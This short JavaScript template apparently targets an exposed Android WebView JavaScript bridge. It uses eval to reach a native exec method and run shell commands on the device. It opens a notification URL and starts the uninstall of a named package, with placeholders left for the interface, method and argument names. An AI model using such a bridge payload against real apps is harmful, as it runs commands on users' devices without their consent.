template = function(){
    var urlToNotifyUser = "<notification_to_users>";
    var shouldNotifyUser = true;
    var shouldUninstall = true;

    var packageName = "PKG_NAME";

    var jsiObjectName = "INTERFACE_NAME";
    var jsiExecApiName = "EP_NAME";

    if(shouldNotifyUser){ 
    var cmdNotifyUser = "am start -a android.intent.action.VIEW -d " + urlToNotifyUser;
    eval(jsiObjectName + '.' + jsiExecApiName)(ARG_PATTERN_NOTIFY_USER)
    }

    if(shouldUninstall){ 
    var cmdDelete = "am start -a android.intent.action.DELETE -d package:" + packageName;
    eval(jsiObjectName + '.' + jsiExecApiName)(ARG_PATTERN_DELETE_APP)
    }
    }()